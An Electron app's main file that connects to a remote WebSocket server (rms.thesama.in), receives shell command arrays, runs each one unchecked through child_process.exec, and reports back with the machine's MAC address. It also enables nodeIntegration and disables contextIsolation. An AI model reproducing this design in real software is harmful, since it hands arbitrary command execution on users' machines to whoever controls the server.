const { app, BrowserWindow } = require("electron");
const path = require("path");
const WebSocket = require("ws");
const { exec } = require("child_process");
const os = require("os");
const fs = require("fs");

// Path to the JSON file for channels
const channelFilePath = path.join(__dirname, "channel.json");

function createWindow() {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  win.loadFile("index.html"); // Load your HTML file
  setupWebSocket(); // Set up WebSocket connection
}

app.whenReady().then(createWindow);

function setupWebSocket() {
  let channelNames = getCurrentChannel();
  let ws_host = "localhost";
  let ws_port = "8080";
  const rws = new WebSocket("wss://rms.thesama.in");

  rws.on("open", () => {
    console.log("[Client] Connected to WebSocket server.");
    const message = JSON.stringify({
      type: "subscribe",
      channels: channelNames,
    });
    rws.send(message);
  });

  rws.on("message", async (data) => {
    const dataObj = JSON.parse(data);
    const commands = dataObj.commands;
    console.log(`[Client] Command received from server: ${typeof commands}`);
    const macAddress = getMacAddress();

    if (!Array.isArray(commands)) {
      console.error("Received commands is not an array:", commands);
      rws.send(
        JSON.stringify({
          success: false,
          mac: macAddress,
          error: "Commands is not an array",
        })
      );
      return;
    }

    try {
      for (const command of commands) {
        await executeCommand(command);
      }
      rws.send(JSON.stringify({ success: true, mac: macAddress }));
    } catch (error) {
      console.error("An error occurred while executing commands:", error);
      rws.send(JSON.stringify({ success: false, mac: macAddress }));
    }
  });

  rws.on("close", (event) => {
    console.log("[Client] Connection closed.");
  });

  rws.on("error", (error) => {
    console.error("[Client] Error: " + error.message);
  });
}

function getCurrentChannel() {
  try {
    const data = fs.readFileSync(channelFilePath, "utf8");
    const parsedData = JSON.parse(data);
    return parsedData.currentChannel || [];
  } catch (error) {
    console.error("Error reading channel data:", error);
    return [];
  }
}

function getMacAddress() {
  const networkInterfaces = os.networkInterfaces();
  for (let interfaceName in networkInterfaces) {
    const networkDetails = networkInterfaces[interfaceName];
    for (let i = 0; i < networkDetails.length; i++) {
      if (
        networkDetails[i].mac &&
        networkDetails[i].mac !== "00:00:00:00:00:00"
      ) {
        return networkDetails[i].mac;
      }
    }
  }
  return "Unknown MAC Address";
}

const executeCommand = (command) => {
  return new Promise((resolve, reject) => {
    console.log(`Executing command: ${command}`);

    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error executing command "${command}": ${error.message}`);
        reject(error);
      } else {
        console.log(`Output of "${command}":\n${stdout}`);
        resolve();
      }
    });
  });
};
